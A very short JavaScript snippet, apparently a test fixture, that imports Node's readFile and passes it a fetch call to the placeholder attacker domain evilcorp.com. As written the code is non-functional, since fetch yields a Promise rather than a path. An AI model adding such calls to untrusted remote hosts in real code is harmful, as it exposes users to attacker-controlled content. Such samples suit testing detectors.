import { readFile } from 'fs';

readFile(fetch('https://evilcorp.com/hacky-hacky'), (err, data) => {
  if (err) throw err;
});
